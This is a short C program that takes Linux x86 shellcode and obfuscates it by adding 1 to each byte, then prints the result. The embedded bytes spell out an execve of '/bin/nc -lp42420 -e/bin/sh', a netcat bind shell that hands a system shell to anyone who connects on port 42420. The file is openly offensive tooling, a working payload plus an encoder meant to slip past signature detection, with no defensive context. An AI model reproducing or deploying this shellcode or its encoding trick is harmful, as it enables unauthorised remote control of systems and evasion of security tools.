#include <unistd.h>


int main() {
  /* our netcat shellcode obtained via ./get_opcodes */
  char shellcode[] = "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x30\x2d\x6c\x70\x34\x32\x34\x32\x30\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x30\x43\x41\x36\x34\x37\x5f\x45\x4c\x49\x54\x45\x5f\x54\x45\x41\x4d";

  char *encode;
  size_t i;

  size_t const shellcode_len = strlen(shellcode);
  if ((encode = malloc(shellcode_len)) == NULL)
    exit(2);
  for (i = 0 ; i < shellcode_len ; ++i)
    encode[i] = shellcode[i] + 1;                           // Add 1 to each byte of netstat shellcode

  for (i = 0 ; i < shellcode_len ; ++i)                     // Print encoded shellcode
    printf("\\x%02x", ((unsigned char *)encode)[i]);

  printf("\nLength : %d\n", strlen(encode));                // Print encoded shellcode length
  free(encode);
  return 0;
}
